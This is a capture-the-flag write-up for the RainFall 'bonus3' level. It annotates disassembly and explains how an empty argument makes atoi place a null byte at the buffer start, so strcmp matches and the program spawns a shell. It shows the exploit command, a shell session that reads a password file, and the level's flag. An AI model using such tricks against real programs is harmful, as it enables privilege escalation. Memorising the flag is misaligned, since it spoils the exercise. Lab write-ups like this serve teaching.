# Bonus3

## **Binary Analysis**

After analyzing the binary with GDB, we found that the program opens a password file, reads its content into a buffer, converts our input into a number using `atoi()`, places a null byte at the corresponding position, and then compares our input with the modified buffer. If they match, the program grants a shell.

```nasm
; Stack setup
0x080484f4 <+0>:     push   %ebp              ; Save old base pointer
0x080484f5 <+1>:     mov    %esp,%ebp         ; Set new base pointer
0x080484fc <+8>:     sub    $0xa0,%esp        ; Allocate 160 bytes on stack

; File opening
0x08048502 <+14>:    mov    $0x80486f0,%edx   ; "r" (read mode)
0x08048507 <+19>:    mov    $0x80486f2,%eax   ; File path (.pass)
0x08048513 <+31>:    call   0x8048410 <fopen@plt>  ; Open file

; Buffer setup
0x0804851f <+43>:    lea    0x18(%esp),%ebx   ; Buffer at esp+24
0x08048523 <+47>:    mov    $0x0,%eax         ; Set eax to 0
0x08048528 <+52>:    mov    $0x21,%edx        ; Size = 33 bytes
0x08048531 <+61>:    rep stos %eax,%es:(%edi) ; Zero the buffer

; First read operation
0x0804856c <+120>:   movl   $0x1,0x4(%esp)    ; Read 1 element
0x0804855c <+104>:   movl   $0x42,0x8(%esp)   ; Size = 66 bytes
0x0804856f <+123>:   call   0x80483d0 <fread@plt>

; Convert argument to number
0x0804857f <+139>:   mov    (%eax),%eax       ; Get argv[1]
0x08048584 <+144>:   call   0x8048430 <atoi@plt>  ; Convert to integer

; Place null byte
0x08048589 <+149>:   movb   $0x0,0x18(%esp,%eax,1) ; Place null byte at returned index

; Compare strings
0x080485da <+230>:   call   0x80483b0 <strcmp@plt> ; Compare strings
0x080485df <+235>:   test   %eax,%eax         ; Check result
0x080485e1 <+237>:   jne    0x8048601         ; Jump if not equal

; Execute shell if equal
0x080485fa <+262>:   call   0x8048420 <execl@plt>

```

## **Vulnerability**

The vulnerability in this program lies in how it processes the input:

1. The input is converted into a number using `atoi()`.
2. A null byte is placed at the corresponding index within the buffer.
3. The modified buffer is then compared with the original input.

If the null byte is placed at the start, the buffer appears empty, and `strcmp()` sees both strings as empty, resulting in a successful match and granting shell access.

## **Exploit**

By controlling the null byte placement via `atoi()`, we can manipulate the buffer. If an empty string (`""`) is passed as input, `atoi()` returns 0, causing a null byte to be placed at the start of the buffer. This results in `strcmp()` comparing two empty strings, leading to a shell.

**Exploitation Flow:**

```c
Input: ""
↓
atoi("") → 0
↓
buffer[0] = '\0'
↓
strcmp("", "\0321b6f81659f9a71c76616f606e4b50...")
↓
strcmp sees: "" vs ""
↓
Match! → Get Shell

```

**Exploit Execution:**

```bash
./bonus3 "$(python -c 'print ""')"

```

**Result:**

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$
```

## **Flag**

```bash
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

# End

```python
end@RainFall:~$ cat end
Congratulations graduate!
end@RainFall:~$
```